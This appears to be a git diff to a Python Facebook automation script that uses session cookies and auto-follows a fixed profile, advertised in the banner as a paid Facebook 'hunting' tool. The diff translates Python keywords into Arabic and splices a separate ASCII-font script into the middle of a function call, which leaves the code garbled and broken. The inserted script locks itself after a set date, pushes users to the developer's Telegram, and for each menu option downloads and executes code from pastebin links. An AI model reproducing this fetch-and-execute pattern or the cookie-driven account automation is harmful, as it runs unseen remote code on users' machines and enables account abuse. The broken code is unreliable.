@@ -1,8 +1,8 @@
-import os,sys,time,json,random,re,string,platform,base64,uuid
-os.system("git pull")
-from bs4 import BeautifulSoup as sop
-from bs4 import BeautifulSoup
-import requests as ress
+استيراد  نظام التشغيل ، sys ، الوقت ، json ، عشوائي ، إعادة ، سلسلة ، منصة ، base64 ، uuid
+نظام التشغيل . النظام ( "بوابة السحب" )
+من  bs4  استيراد  BeautifulSoup  as  sop
+من  bs4  استيراد  BeautifulSoup
+ طلبات  الاستيراد ريس  _
 from datetime import date
 from datetime import datetime
 from time import sleep
@@ -42,7 +42,173 @@ def cek_apk(session,coki):
 
 def follow(self, session, coki):
         r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
-            'cookie': coki }, **('cookies',)).text, 'html.parser')
+            'cookie': coki }, **('cookies',)).text, 'html.parser')import requests,time,pyfiglet,datetime,webbrowser
+now = datetime.datetime.today()
+
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
+
+
+hours = (now.hour)
+x = datetime.datetime.now()
+g= datetime.datetime(2023, 5, 5, 1, 10 ,9)
+
+if (x.strftime("%x"))>(g.strftime("%x")):
+ print('\x1b[1;92mاشترك بالاداة للتفعيل')
+ time.sleep(1)
+ print('\x1b[1;91m[+]telegram:@NN11N11-@NN11N11-@nade20080')
+ time.sleep(1.7)
+ print('\x1b[1;93m[+]instagram:@NN11N11') 
+ time.sleep(1.3)
+ print('\x1b[1;96mسيتم نقلك الى تلغرام المطور للاشتراك خلال 10 ثواني')
+ time.sleep(1)
+ print('\x1b[1;91m1')
+ time.sleep(1)
+ print('\x1b[1;91m2')
+ time.sleep(1)
+ print('\x1b[1;91m3')
+ time.sleep(1)
+ print('\x1b[1;91m4')
+ time.sleep(1)
+ print('\x1b[1;91m5')
+ time.sleep(1)
+ print('\x1b[1;91m6')
+ time.sleep(1)
+ print('\x1b[1;91m7')
+ time.sleep(1)
+ print('\x1b[1;91m8')
+ time.sleep(1)
+ print('\x1b[1;91m9')
+ time.sleep(1)
+ print('\x1b[1;91m10')
+ webbrowser.open('https://t.me/KBKBOT?start=6242724080')
+ exit()
+import os
+try:
+    import pyfiglet
+except ImportError:
+    os.system("pip install pyfiglet")
+try:
+    import sys
+except ImportError:
+    os.system("pip install sys")
+try:
+    import requests
+except ImportError:
+    os.system("pip install requests")
+try:
+    import webbrowser
+except ImportError:
+    os.system("pip install webbrowser")
+try:
+    import time
+except ImportError:
+    os.system("pip install time")
+
+
+if os.name == 'nt':
+    os.system("cls")
+else:
+    os.system("clear")
+def NiXXR(PWT):
+    for e in PWT:
+     sys.stdout.write(e) 
+     sys.stdout.flush() 
+     time.sleep(11/11109)
+NiXXR('''\n
+
+\033[1;32m___________________________________
+\033[1;31m _   _    _    ____  _____ ____ 
+\033[1;32m |\ | |  / \  |  _ \| ____|  _ \ 
+\033[1;33m | \| | / _ \ | | | |  _| | |_) | 
+\033[1;36m |  |\|/ ___ \| |_| | |___|  _ < 
+\033[1;35m |_| \_/_/   \_\____/|_____|_| \_\ 
+\033[1;32m___________________________________
+\033[1;33m{VIP} : \033[1;31m شروحات نادر
+\033[1;31m{VIP} : \033[1;34m المطور نادر
+\033[1;36m{VIP} : \033[1;35m معرف المطور  @NN11N11_bot
+\033[1;34m{VIP} : \033[1;36m قناه المطور @nade20080
+\033[1;35m{VIP} : \033[1;32m اداه صيد فيسبوك مدفوعه
+\033[1;32m{VIP} : \033[1;33m الاداه موقته مجانيه 
+
+''')
+
+NiXXR(f"""\033[1;35m=== === === === === === === ===
+\033[1;32m[\033[1;33m1\033[1;32m] \033[1;33mScript Font
+\033[1;32m[\033[1;33m2\033[1;32m] \033[1;33mShimrod Font
+\033[1;32m[\033[1;33m3\033[1;32m] \033[1;33mArrows Font
+\033[1;32m[\033[1;33m4\033[1;32m] \033[1;33m  الافضل 
+\033[1;32m[\033[1;33m5\033[1;32m] \033[1;33mSlant Font
+\033[1;32m[\033[1;33m6\033[1;32m] \033[1;33mBasic Font
+\033[1;32m[\033[1;33m7\033[1;32m] \033[1;33mDoom Font
+\033[1;32m[\033[1;33m8\033[1;32m] \033[1;33mBlock Font
+\033[1;32m[\033[1;33m9\033[1;32m] \033[1;33mDouble Font
+\033[1;32m[\033[1;33m10\033[1;32m] \033[1;33mDrpepper Font
+\033[1;32m[\033[1;33m11\033[1;32m] \033[1;33mTiles Font
+\033[1;32m[\033[1;33m12\033[1;32m] \033[1;33mStop Font
+\033[1;32m[\033[1;33m13\033[1;32m] \033[1;33mSlscript Font
+\033[1;32m[\033[1;33m14\033[1;32m] \033[1;33mSpeed Font 
+\033[1;35m=== === === === === === === ===
+\033[1;32m[\033[1;34m?\033[1;32m] \033[1;34mChoose : \033[0m""")
+font = input("")
+if os.name == 'nt':
+    os.system("cls")
+else:
+    os.system("clear")
+if font == '1':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/bTheBrQY").text)
+if font =='2':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/sbHpWp6m").text)
+if font =='3':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/AUXTYFdr").text)
+if font =='4':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36m اكتب اسمك بلانجلش وليس بلعربي:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/y05ScBGD").text)
+if font =='5':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/6RH6A9gK").text)
+if font =='6':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/AqBsC1rw").text)
+if font =='7':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/FBR8tm1b").text)
+if font =='8':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/ZjStYa4V").text)
+if font =='9':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/VseR2czY").text)
+if font == '10':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/srR5fqJa").text)
+if font == '11':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/vMPkNs49").text)
+if font == '12':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/e4x3rtz8").text)
+if font == '13':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/GUnnBESg").text)
+if font == '14':
+    nam = input("\033[1;90m[\033[1;36m`\033[1;90m]\033[1;36mEnter a Text:  \033[0m")
+    exec(requests.get("https://pastebin.com/raw/i1J8gvxn").text)
+if font =='X':
+    webbrowser.open("https://t.me/nade20080")
+    sys.exit()
+if font =='x':
+    webbrowser.open("https://t.me/nade20080")
+    sys.exit()
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://mbasic.facebook.com' + str(get), {
             'cookie': coki }, **('cookies',)).text
